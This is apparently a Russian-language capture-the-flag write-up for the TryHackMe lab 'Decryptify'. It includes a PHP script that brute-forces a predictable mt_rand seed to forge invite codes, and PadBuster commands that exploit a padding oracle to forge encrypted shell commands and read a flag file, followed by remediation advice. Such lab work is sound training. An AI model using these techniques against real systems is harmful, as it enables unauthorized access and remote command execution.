# Отчёт о проникновении в «Decryptify»

## 1. Введение

В рамках задания проводилось тестирование на проникновение учебной машины **Decryptify** (TryHackMe). По условию, это задание посвящено **криптографическим уязвимостям**: предсказуемой генерации токенов, padding oracle и подделке шифротекста.

Цель — пройти аутентификацию, получить доступ к панели управления и прочитать флаг через **Padding Oracle Attack**.

В отчёте последовательно описаны все этапы работы, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.


## 2. Первичная разведка (Nmap)

Сканирование целевого хоста выявило два открытых порта:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux)
| ssh-hostkey:
|   3072 7f:9e:5b:38:29:e1:66:fe:b6:f1:c6:a9:8a:00:6d:ea (RSA)
|   256 46:c9:73:c3:18:fd:7d:cc:f0:ca:f9:43:bc:8e:c1:c0 (ECDSA)
|_  256 7d:b8:2e:59:10:47:24:0c:c9:bd:e4:6a:9e:61:80:2e (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login - Decryptify
```

Открыты два порта: SSH (22) и HTTP (1337). Заголовок страницы — «Login - Decryptify». Cookie `PHPSESSID` установлена **без флага `HttpOnly`**.


## 3. Исследование приложения на порту 1337

### 3.1. Формы входа

На странице обнаружены **две формы**:

- **Email + invite code**.
- **Username + invite code**.

### 3.2. Обфусцированный JavaScript (`api.js`)

В исходном коде обнаружен обфусцированный JS:

```javascript
function b(c,d){const e=a();return b=function(f,g){f=f-0x165;let h=e[f];return h;},b(c,d);}const j=b;function a(){const k=['16OTYqOr','861cPVRNJ','474AnPRwy','H7gY2tJ9wQzD4rS1','5228dijopu','29131EDUYqd','8756315tjjUKB','1232020YOKSiQ','7042671GTNtXE','1593688UqvBWv','90209ggCpyY'];a=function(){return k;};return a();}(function(d,e){const i=b,f=d();while(!![]){try{const g=parseInt(i(0x16b))/0x1+-parseInt(i(0x16f))/0x2+parseInt(i(0x167))/0x3*(parseInt(i(0x16a))/0x4)+parseInt(i(0x16c))/0x5+parseInt(i(0x168))/0x6*(parseInt(i(0x165))/0x7)+-parseInt(i(0x166))/0x8*(parseInt(i(0x16e))/0x9)+parseInt(i(0x16d))/0xa;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0xe43f0));const c=j(0x169);
```

**Для доступа к `api.php` требуется master password.**

### 3.3. Скрытые директории и файлы

Обнаружены:

- `/phpmyadmin`.
- `/logs`.

### 3.4. Логи

**Содержимое `/logs`:**

```
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

**Ключевое:**

- Пользователь `alpha@fake.thm` **деактивирован**.
- Для `alpha@fake.thm` был создан **invite-код** `MTM0ODMzNzEyMg==`.
- Создан новый пользователь `hello@fake.thm`.

### 3.5. Попытка входа под `hello@fake.thm`

При попытке авторизации под `hello@fake.thm` с кодом `MTM0ODMzNzEyMg==` происходит **редирект на логин**, а не на дашборд. Код **не подходит** для `hello@fake.thm` — он был создан для `alpha@fake.thm`.


## 4. Получение master-пароля для `api.php`

### 4.1. Выполнение `api.js`

При выполнении обфусцированного JS удалось получить значение переменной `c` — это **master-пароль** для `api.php`.

**Пароль:** `H7gY2tJ9wQzD4rS1`.


## 5. Исследование `api.php`

### 5.1. Функция генерации invite-кода

**В `api.php` найдена функция:**

```php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
     $seed_value = calculate_seed_value($email, $constant_value);
     mt_srand($seed_value);
     $random = mt_rand();
     $invite_code = base64_encode($random);
```

**Что она делает:**

1. `calculate_seed_value` — вычисляет **seed** из email и константы.
2. `mt_srand($seed_value)` — **инициализирует** генератор **Mersenne Twister**.
3. `mt_rand()` — **генерирует** случайное число.
4. `base64_encode($random)` — **кодирует** в base64.

**Ключевая уязвимость:** `mt_srand` делает генератор **детерминированным**. Если знать `seed`, можно **предсказать** invite-код.

### 5.2. Задача

Нужно **сгенерировать invite-код** для `hello@fake.thm`. Для этого нужно **определить `constant_value`**, исходя из **готовой комбинации** `alpha@fake.thm:MTM0ODMzNzEyMg==`.


## 6. Подбор `constant_value`

### 6.1. Скрипт на PHP

**Написан скрипт для подбора `constant_value`:**

```php
<?php
$email = 'alpha@fake.thm';
$target = 'MTM0ODMzNzEyMg==';

for ($cv = 0; $cv <= 2000000; $cv++) {
    $seed = hexdec(strlen($email) + $cv + hexdec(substr($email, 0, 8)));
    mt_srand($seed);
        $random = mt_rand();
        $invite = base64_encode($random);
        if ($invite === $target) {
            echo "FOUND: constant=$cv, seed=$seed";
            exit;
    }
}
echo "Not found\n";
?>
```

### 6.2. Результат

```
FOUND: constant=99999, seed=1324931
```

**Константа обнаружена:** `99999`.
**Seed:** `1324931`.

### 6.3. Генерация кода для `hello@fake.thm`

**Скорректирован скрипт для генерации кода для `hello@fake.thm`.**

**Invite-код:** `NDYxNTg5ODkx`.

### 6.4. Успешная авторизация

После успешной авторизации — **редирект на `/dashboard.php`** и **получение флага на панели**.


## 7. Исследование панели управления

### 7.1. Пользователь `admin@fake.thm`

В панели найден пользователь `admin@fake.thm`.

**Сгенерирован код:** `MTc0OTQ0NzAzNw==`.

**Но ответ сервера:** «код неверный».

### 7.2. Cookie `role`

При проверке cookie установлена `role`:

```
d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d
```

**Hash идентифицирован как `sha384`:**

```
[+] SHA-384
[+] SHA3-384
[+] Skein-512(384)
[+] Skein-1024(384)
```

**Не удалось расшифровать значение.**


## 8. Padding Oracle Attack

### 8.1. Обнаружение уязвимости

В исходном коде найдено:

```html
<form method="get">
    <input type="hidden" name="date" value="Vc8CO5MRFYWbApVST14qrUx2DhbHX7yub7hMhPhxm+8=">
</form>
```

При взаимодействии:

```
http://10.128.155.142:1337/dashboard.php?date=Vc8CO5MRFYWbApVST14qrUx2DhbHX7yub7hMhPhxm+8=
```

**На странице появилась ошибка:**

```
Padding error: error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length
```

**Это Padding Oracle.** Сервер **по-разному** отвечает на **валидный** и **невалидный** padding.

### 8.2. Использование PadBuster

**Команда:**

```bash
padbuster http://10.128.185.18:1337/dashboard.php\?date\=9TIcQR66SRoFrkHUmglYVCb0XONzEo5Vpz0/sG+ScF8= 9TIcQR66SRoFrkHUmglYVCb0XONzEo5Vpz0/sG+ScF8= 8 -encoding 0 -cookies "PHPSESSID=35kb1t21cbicdakteji7iefs4d;role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d" -plaintext 'whoami'
```

**Результат:** `www-data`.

**Вывод:** Padding Oracle работает, и PadBuster успешно **подделал** команду `whoami`.

### 8.3. Чтение флага

**Команда:**

```bash
padbuster http://10.129.162.8:1337/dashboard.php\?date\=A0AkGN4gXrlEV66xaqDhWQcEhQXKWDW4dl6QRl7jwac= A0AkGN4gXrlEV66xaqDhWQcEhQXKWDW4dl6QRl7jwac= 8 -encoding 0 -cookies "PHPSESSID=7g6g3f06um5iaoc3cpe98s0nm8;role=d057af5933d8acebfe290fe2bbd540e08a2a81a22eff55969a89a7dbe84fb98cd6cbda066ed79220eba70afb9b3d4e0d" -plaintext 'cat /home/ubuntu/flag.txt'
```

**Результат:** флаг прочитан.


## 9. Цепочка атаки

1. **Nmap** → порты 22, 1337.
2. **Порт 1337** → формы логина, `api.js`, `/logs`, `/phpmyadmin`.
3. **`api.js`** → master-пароль `H7gY2tJ9wQzD4rS1`.
4. **`api.php`** → функция генерации invite-кода.
5. **Подбор `constant_value`** → `99999`.
6. **Генерация кода для `hello@fake.thm`** → `NDYxNTg5ODkx`.
7. **Авторизация** → `/dashboard.php` → флаг на панели.
8. **Padding Oracle** → PadBuster → подделка команды → RCE.


## 10. Разбор уязвимостей

| Уязвимость | Описание | Влияние |
|---|---|---|
| **Предсказуемый PRNG** | `mt_srand` с известным seed | Предсказание invite-кода |
| **Слабый seed** | `constant_value=99999` | Подбор константы |
| **Padding Oracle** | Сервер раскрывает ошибку padding | Расшифровка и подделка шифротекста |
| **RCE через `date`** | Сервер выполняет расшифрованную команду | Выполнение команд |
| **Cookie без `HttpOnly`** | `PHPSESSID` без флага | Кража сессии через XSS |
| **Обфускация вместо защиты** | `api.js` с master-паролем | Пароль извлекается |

---

## 11. Рекомендации по устранению

1. **Использовать криптостойкий PRNG** (`random_int`, `random_bytes`) вместо `mt_srand`/`mt_rand`.
2. **Не хранить секреты в обфусцированном JS** — использовать серверную логику.
3. **Устранить Padding Oracle** — возвращать **одинаковый** ответ на **любой** невалидный padding.
4. **Не выполнять команды** из расшифрованного `date` — использовать whitelist.
5. **Установить `HttpOnly`** на cookie.
6. **Не логировать invite-коды** в открытом виде.


## 12. Заключение

Задание пройдено полностью. Цепочка атаки: **обфусцированный JS → master-пароль → `api.php` → подбор `constant_value` → генерация invite-кода → авторизация → Padding Oracle → RCE → флаг**. Ключевые ошибки — **предсказуемый PRNG**, **Padding Oracle** и **выполнение команд из расшифрованного параметра**. Все шаги выполнены в логике «как реальный атакующий»: разведка → анализ → эксплуатация → RCE → флаг. Цель достигнута — **флаг получен**.